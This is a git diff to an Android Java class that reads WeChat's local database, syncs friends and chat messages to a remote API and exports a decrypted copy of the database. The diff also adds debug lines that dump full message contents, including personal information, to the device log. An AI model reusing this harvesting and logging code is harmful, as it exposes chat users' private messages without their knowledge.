@@ -1,6 +1,8 @@
 package com.qingyun.zhiyunelu.ds.op;
 
 
+import android.util.Log;
+
 import com.qingyun.zhiyunelu.ds.App;
 import com.qingyun.zhiyunelu.ds.data.SyncWechatFriendsDto;
 import com.qingyun.zhiyunelu.ds.data.SyncWechatMessagesDto;
@@ -35,7 +37,7 @@ public class WechatCenter {
         ExceptionUtil.executeWithRetry(() -> {
             LogStub.log(new LogEntry(LogStub.LOG_LEVEL_DEBUG, this, "Starting sync wechat database..."));
             FileUtil.deleteFile(assistant.getWxTempDirPathRoot());
-            op.checkWechatAndRun(assistant.createWxTempDirPath(), sql -> {
+            op.checkWechatAndRun(App.getInstance().getAssistant().getDefaultContext(),assistant.createWxTempDirPath(), sql -> {
                 WechatMeInfo me = op.obtainMe(sql);
                 LogStub.log(new LogEntry(LogStub.LOG_LEVEL_DEBUG, this, "Processing wechat friends, me is: %s", SerializationUtil.describe(me)));
                 SyncWechatFriendsDto dtoFriends = new SyncWechatFriendsDto();
@@ -61,6 +63,8 @@ public class WechatCenter {
                         dto.repUserName = me.userName;
                         dto.userChats = friendMessages.toArray(new WechatMessagesInfo[0]);
                         assistant.getApi().createSyncApi().syncWechatMessages(dto);
+                        Log.e( "微信好友消息",SerializationUtil.describe(dto)+"几个好友或群消息："+friendMessages.size());
+                        Log.e("----WechatCenter----",SerializationUtil.describe(dto));//个人信息
                         count = 0;
                         friendMessages.clear();
                     }
@@ -71,6 +75,6 @@ public class WechatCenter {
     }
 
     public void exportWxDatabase() {
-        ExceptionUtil.executeWithRetry(() -> op.checkWechatAndRun(this.assistant.createWxTempDirPath(), sql -> WechatOperator.exportDecodedDB(sql, PathUtil.concat(assistant.getMiscDir().getPath(), this.assistant.getSetting().path.decryptedWxDbFileName))), 1, null);
+        ExceptionUtil.executeWithRetry(() -> op.checkWechatAndRun(App.getInstance().getAssistant().getDefaultContext(),this.assistant.createWxTempDirPath(), sql -> WechatOperator.exportDecodedDB(sql, PathUtil.concat(assistant.getMiscDir().getPath(), this.assistant.getSetting().path.decryptedWxDbFileName))), 1, null);
     }
 }
